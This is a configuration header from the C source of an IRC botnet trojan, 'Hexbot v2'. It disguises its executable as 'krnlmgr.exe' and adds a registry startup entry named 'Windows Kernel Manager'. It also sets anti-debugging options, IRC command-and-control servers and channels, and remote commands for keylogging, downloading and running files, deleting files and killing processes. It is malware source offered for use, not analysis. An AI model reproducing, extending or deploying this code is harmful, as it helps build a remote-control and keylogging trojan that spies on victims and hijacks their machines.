#define SystemEXE "\\krnlmgr.exe"
#define RegistryRun "Windows Kernel Manager"
const char BotMutex[] = "34hg34f978";	// Mutex to prevent multiple instances from running
//#define ALLOW_MULTIPLES "Uncomment this if you want the program to be able to run multiple instances"
//#define NO_CPY_STARTUP "Uncomment this if you don't want to copy to startup"
//#define NO_ANTI_DEBUGGING "Uncomment this if you don't want anti debugging"

const char shost[]    =  "irc.undernet.org";	// Main Server
const char bhost[]    =  "irc.bolchat.org";		// Back Server
	
const int  sPort       =   6667;		// Main Server Port
const int  bPort       =   6666;		// Back Server Port

const char HomeChan [] =  "#myb0tchan";		// Main Server Channel
const char BacChan  [] =  "#secondchan";	// Back Server Channel
	 
const char ChanPass [] =  "pass";			 // Channel password	
const char bPrefix  [] = "[h3x]";			// Bot prefix
const char Botpwd   [] = "pass";			// Bot password
const char bver     [] = "Hexbot v2: Awesome Edition";	// Bot version

//bot commands
//These commands u can send on pvt to b0t or on the HomeChan/BackChan.
const char Prefix      [] = ".";	    //1	Command prefix Example: .version
const char login_cmd   [] = "login";    //2
const char op_cmd      [] = "op";       //3
const char deop_cmd    [] = "deop";     //4
const char v_cmd       [] = "v";        //5
const char vn_cmd      [] = "-v";	    //6
const char kick_cmd    [] = "kick";     //7
const char ban_cmd     [] = "ban";      //8
const char unban_cmd   [] = "unban";    //9
const char join_cmd    [] = "join";     //10
const char logout_cmd  [] = "logout";   //11
const char part_cmd    [] = "part";     //12
const char hop_cmd     [] = "hop";      //13
const char reco_cmd    [] = "reconnect";//14
const char rndn_cmd    [] = "rndnick";  //15
const char die_cmd     [] = "die";      //16
const char raw_cmd     [] = "raw";      //17
const char status_cmd  [] = "status";   //18
const char dns_cmd     [] = "dns";      //19
const char listf_cmd   [] = "listf";    //20
const char dccget_cmd  [] = "get";      //21
const char process_cmd [] = "listp";    //22
const char killp_cmd   [] = "killp";    //23
const char listd_cmd   [] = "listd";    //24
const char run_cmd	   [] = "run";	    //25
const char md_cmd      [] = "makedir";  //26
const char rd_cmd      [] = "removedir";   //27
const char del_cmd     [] = "del";	    //28
const char ren_cmd     [] = "ren";	    //29
const char thr_cmd     [] = "threads";  //30
const char killthr_cmd [] = "killthr";  //31
const char keylogg_cmd [] = "keyspy";   //32
const char keystop_cmd [] = "keystop";  //33
const char delay_cmd   [] = "delay";    //34
const char download_cmd[] = "download"; //35
const char msg_cmd	   [] = "msg";		//36
const char notice_cmd  [] = "notice";	//37

const short flood        = 2600;

const char ok_cmd     [] = "\2Operation Complete";
const char no_cmd     [] = "\2Operation Error";

const char kdir       [] = "C:\\";
const char kfilename  [] = "Log.txt";

const char botmtx	  [] = "h3xb0t";
//-------------------------------
//Requests of this commands bot will send on HomeChan/BacChan
const char ver_cmd    [] = "version";
const char sys_cmd    [] = "sysinfo";

#define maxlogins  5

/* To request a better documentation of the IRC Bot commands,
** you may contact me by Googling for "VX Heavens Bull Moose Twitter",
** Open the page that has my twitter, and contact me from there. */
